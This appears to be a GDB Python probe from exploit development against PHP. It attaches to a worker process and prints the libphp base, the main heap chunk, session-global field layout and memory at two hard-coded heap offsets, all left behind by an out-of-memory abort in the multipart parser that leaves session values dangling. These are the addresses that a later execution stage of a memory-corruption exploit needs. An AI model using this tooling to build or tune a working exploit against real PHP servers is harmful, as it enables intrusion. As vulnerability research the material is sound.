# a2_state.gdb - what A2 leaves behind, in addresses the leak can supply.
#
# A2 is the cheap OOM that aborts the multipart parser before module shutdown, leaving PS values
# dangling in a chunk that is then recycled. The execution stage needs three addresses: the libphp
# base (B gives it), the main chunk (the leak shows it as the second cluster) and the two heap slots
# the reference calls hsv and S. This probe prints all of them plus the field layout, so the offsets
# can be checked against our image instead of being copied from the reference notes.
#
#   sudo gdb -q -batch -p <worker> -ex 'ptype /o ps_globals' -x gdb/a2_state.gdb
set pagination off
set confirm off
set width 0

python
import gdb

CHUNK = 0x200000
HSV = 0x7D720
S = 0xF8398


def mem(addr, size):
    try:
        return gdb.selected_inferior().read_memory(addr, size).tobytes()
    except Exception:
        return None


def q(addr, size=8):
    raw = mem(addr, size)
    return None if raw is None else int.from_bytes(raw, "little")


def field(name):
    try:
        return int(gdb.parse_and_eval("(unsigned long)&ps_globals.%s" % name))
    except Exception:
        return 0


def module_range(pid, needle="libphp"):
    lo = hi = 0
    try:
        with open("/proc/%d/maps" % pid) as fh:
            for line in fh:
                if needle not in line:
                    continue
                start, _, end = line.split()[0].partition("-")
                s, e = int(start, 16), int(end, 16)
                lo = s if not lo or s < lo else lo
                hi = max(hi, e)
    except OSError:
        pass
    return lo, hi


def zval(addr):
    if not addr:
        return "n/a"
    v, t = q(addr), q(addr + 8, 4)
    return "value=%#x type=%#x" % (v or 0, t or 0)


pid = gdb.selected_inferior().pid
lib, libend = module_range(pid)
try:
    heap = q(int(gdb.parse_and_eval("(unsigned long)&alloc_globals"))) or 0
except Exception:
    heap = 0
main = heap & ~(CHUNK - 1)
ps = 0
try:
    ps = int(gdb.parse_and_eval("(unsigned long)&ps_globals"))
except Exception:
    pass
print("[a2] libphp=%#x-%#x heap=%#x main=%#x ps_globals=%#x" % (lib, libend, heap, main, ps))
print("[a2] PS(id)      : %s" % zval(field("id")))
print("[a2] http_sessvars: %s" % zval(field("http_session_vars")))
print("[a2] id field @%#x  http_session_vars @%#x" % (field("id"), field("http_session_vars")))
if main:
    for name, off in (("hsv", HSV), ("S", S)):
        addr = main + off
        raw = mem(addr, 48)
        print("[a2] %s main+%#x = %#x : %s" % (name, off, addr, raw.hex(" ") if raw else "unreadable"))
        if raw:
            print("[a2]   qwords: " + ", ".join("%#x" % int.from_bytes(raw[i:i + 8], "little")
                                                for i in range(0, 48, 8)))
    # Is the heap pointer itself inside a chunk, and is that chunk the main one?
    print("[a2] heap chunk == main: %s" % (heap and (heap & ~(CHUNK - 1)) == main))
end
